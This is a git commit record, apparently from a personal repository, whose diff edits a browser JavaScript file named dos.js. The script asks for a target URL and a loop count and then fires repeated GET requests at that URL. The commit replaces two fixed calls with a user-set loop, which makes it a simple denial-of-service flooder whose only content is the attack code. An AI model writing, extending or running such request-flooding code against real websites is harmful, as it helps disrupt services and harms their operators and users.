b18bb66659da84074d8f2590aa35894de545064a
Nguyễn Tuấn Anh <iicodonduoimuaii@gmail.com>
2017-06-30 15:49:06 +0700

    Update dos.js

--- test/dos.js
+++ test/dos.js
@@ -1,9 +1,15 @@
 url = prompt("Url: ");
+i =prompt("Loop: ");
 function dos(url){
 var xhr = new XMLHttpRequest();
 xhr.open('GET',"//"+url, true);
 xhr.send();
 }
-dos(url)
-dos(url)
+function loop(i){
+  for(var x=1;x<i;x++){
+    dos(url);
+  }
+}
+loop(i)  
+
 
